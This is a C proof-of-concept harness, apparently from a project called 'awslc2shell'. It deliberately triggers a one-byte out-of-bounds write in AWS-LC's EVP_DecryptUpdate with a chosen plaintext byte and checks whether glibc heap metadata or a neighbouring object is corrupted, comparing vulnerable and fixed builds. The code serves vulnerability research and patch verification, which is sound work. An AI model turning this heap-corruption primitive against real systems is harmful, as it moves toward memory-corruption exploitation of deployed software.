// awslc2shell W206: can the CVE's one-byte OOB write reach glibc allocator
// metadata or a separate live object from a documented-minimum malloc buffer?
// Built into metadata-vuln / metadata-fixed against non-ASan libraries, so the
// write is exercised in the allocator layout a plain process actually uses.
// Usage: metadata-vuln vuln | metadata-fixed fixed
#include <openssl/evp.h>
#include <malloc.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CHOSEN 0x48 /* 'H', plaintext byte 31 */
static const uint8_t kKey[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
static const uint8_t kIv[16] = {0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
                                0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f};

static int make_ciphertext(uint8_t *ct, int *ct_len) {
  uint8_t pt[32];
  for (int i = 0; i < 32; i++) {
    pt[i] = (uint8_t)i;
  }
  pt[31] = CHOSEN;
  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  int n = 0, f = 0, ok = 0;
  if (ctx != NULL &&
      EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, kKey, kIv) &&
      EVP_EncryptUpdate(ctx, ct, &n, pt, 32) &&
      EVP_EncryptFinal_ex(ctx, ct + n, &f) && n + f == 48) {
    *ct_len = n + f;
    ok = 1;
  }
  EVP_CIPHER_CTX_free(ctx);
  return ok;
}

int main(int argc, char **argv) {
  if (argc != 2) {
    fprintf(stderr, "usage: %s LABEL\n", argv[0]);
    return 2;
  }
  uint8_t ct[64];
  int ct_len = 0;
  if (!make_ciphertext(ct, &ct_len)) {
    return 2;
  }

  // Documented minimum for a 16-byte update, then a separate live object.
  uint8_t *buf = malloc(31);
  uint8_t *obj = malloc(16);
  if (buf == NULL || obj == NULL) {
    return 2;
  }
  const size_t usable = malloc_usable_size(buf);
  memset(buf, 0xab, usable);
  memset(obj, 0x5a, 16);
  uint64_t *next_hdr = (uint64_t *)(buf + usable);
  const uint64_t hdr_before = *next_hdr;
  const uint8_t obj_before = obj[0];
  const ptrdiff_t gap = obj - buf;

  // Two boundary-crossing updates with padding on: the second writes 32
  // bytes into the 31-byte buffer, putting plaintext byte 31 at buf[31].
  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  int n = 0;
  int ok = ctx != NULL && EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, kKey, kIv);
  for (int off = 0; ok && off < 32; off += 16) {
    ok = EVP_DecryptUpdate(ctx, buf, &n, ct + off, 16);
  }
  EVP_CIPHER_CTX_free(ctx);

  const uint8_t byte31 = buf[31];
  printf("%s: usable=%zu gap_to_obj=%td byte31=0x%02x chosen=0x%02x "
         "next_header_before=0x%zx next_header_after=0x%zx "
         "header_unchanged=%d neighbor_unchanged=%d decrypt_ok=%d\n",
         argv[1], usable, gap, byte31, CHOSEN, (size_t)hdr_before,
         (size_t)*next_hdr, *next_hdr == hdr_before, obj[0] == obj_before, ok);
  free(obj);
  free(buf);
  return byte31 == CHOSEN ? 0 : 1;
}
